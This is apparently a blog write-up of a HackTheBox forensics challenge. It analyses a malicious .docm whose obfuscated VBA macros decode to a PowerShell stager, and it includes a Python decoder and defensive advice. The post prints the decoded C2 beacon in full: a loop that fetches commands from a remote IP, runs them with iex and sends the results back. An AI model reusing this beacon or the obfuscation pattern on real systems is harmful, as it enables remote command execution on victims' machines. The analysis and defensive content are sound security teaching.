---
layout: post
title: "Halloween Invitation"
date: 2027-08-04 09:00:00 -0500
categories: [HackTheBox, Challenges, Forensics]
tags: [hackthebox, challenge, forensics, vba, macro, docm, obfuscation, powershell, CWE-506]
---

## Overview

Halloween Invitation is an Easy HTB Forensics challenge built around a macro-enabled Word document (`.docm`). The VBA macros hide a PowerShell C2 beacon behind two chained encoding layers — [embedded malicious code](https://cwe.mitre.org/data/definitions/506.html) ([CWE-506](https://cwe.mitre.org/data/definitions/506.html)) — which `olevba` exposes and a short Python script fully decodes.

---

## The Technique

The document's `AutoOpen` macro calls two helper functions that together form a two-layer obfuscation:

**Layer 1 — hex pairs → space-separated decimal numbers**

```vba
Private Function uxdufnkjlialsyp(hexStr) As String
    Dim result As String: result = ""
    Dim i As Integer
    For i = 1 To Len(hexStr) Step 2
        result = result & Chr(Val("&H" & Mid(hexStr, i, 2)))
    Next
    uxdufnkjlialsyp = result
End Function
```

**Layer 2 — space-separated decimal numbers → ASCII characters**

```vba
Private Function wdysllqkgsbzs(strBytes) As String
    Dim nums: nums = Split(strBytes)
    Dim i As Integer: Dim out As String: out = ""
    For i = LBound(nums) To UBound(nums)
        out = out & Chr(nums(i))
    Next
    wdysllqkgsbzs = out
End Function
```

Dozens of calls concatenate the results of these functions into one long string:

```vba
result = result + wdysllqkgsbzs(uxdufnkjlialsyp("3734203635...") & uxdufnkjlialsyp("31392036..."))
```

The concatenated output is a **base64 + UTF-16LE encoded PowerShell C2 stager** that the macro drops to `%TEMP%\history.bak` and executes via `WScript.Shell`.

---

## Solution

Extract the VBA source with `olevba`, then simulate both decoding functions in Python:

```bash
olevba invitation.docm
```

Create `solve.py`:

```python
import re, base64, subprocess

def hex_to_ascii(h):
    return ''.join(chr(int(h[i:i+2], 16)) for i in range(0, len(h), 2))

def decimals_to_chars(s):
    return ''.join(chr(int(n)) for n in s.split())

result = subprocess.run(['olevba', 'invitation.docm'], capture_output=True, text=True)
content = result.stdout

lines = [l.strip() for l in content.split('\n')
         if 'fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + wdysllqkgsbzs' in l]

payload = ""
for line in lines:
    hexes = re.findall(r'uxdufnkjlialsyp\("([0-9a-fA-F]+)"\)', line)
    combined = ''.join(hex_to_ascii(h) for h in hexes)
    payload += decimals_to_chars(combined)

decoded = base64.b64decode(payload).decode('utf-16-le')
print(decoded)
```

```bash
python3 solve.py
```

The decoded output is the PowerShell C2 beacon, with the flag appended at the end:

```powershell
$s='77.74.198.52:8080';$i='d43bcc6d-043f2409-7ea23a2c';$p='http://';
$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/d43bcc6d -Headers @{"Authorization"=$i};
while ($true){
  $c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/043f2409 -Headers @{"Authorization"=$i});
  if ($c -ne 'None') {
    $r=iex $c -ErrorAction Stop -ErrorVariable e;
    $r=Out-String -InputObject $r;
    $t=Invoke-RestMethod -Uri $p$s/7ea23a2c -Method POST -Headers @{"Authorization"=$i} `
       -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')
  }
  sleep 0.8
}
HTB{...}
```

---

## Why It Worked

The VBA macro uses two custom functions — one to decode hex to decimal strings, one to decode decimal strings to characters — and calls them dozens of times to build a large base64-encoded string at runtime. No string ever appears in plaintext in the source; each call contributes only a fragment. The final concatenation, base64-decoded then interpreted as UTF-16LE (standard PowerShell `-EncodedCommand` encoding), yields a working PowerShell C2 polling loop. The flag was embedded by the challenge author at the end of that payload as the artifact to recover.

---

## Fix / Defense

- **Block macros by policy.** Group Policy: `DisableAllMacros` or `VBAWarnings=4`. Trust Center: *Disable all macros without notification*.
- **Triage with oletools.** `olevba <file>` flags `AutoOpen`, `CreateObject("WScript.Shell")`, and `Environ("TEMP")` — any one is a high-severity indicator.
- **Sandbox before opening.** Detonate in an isolated VM; the beacon callback and PowerShell payload become visible in network traffic immediately.
- **EDR alert pattern.** Office process → `WScript.Shell` → `powershell.exe` with a `-enc` flag is a well-known macro dropper chain; any modern EDR can alert on it.
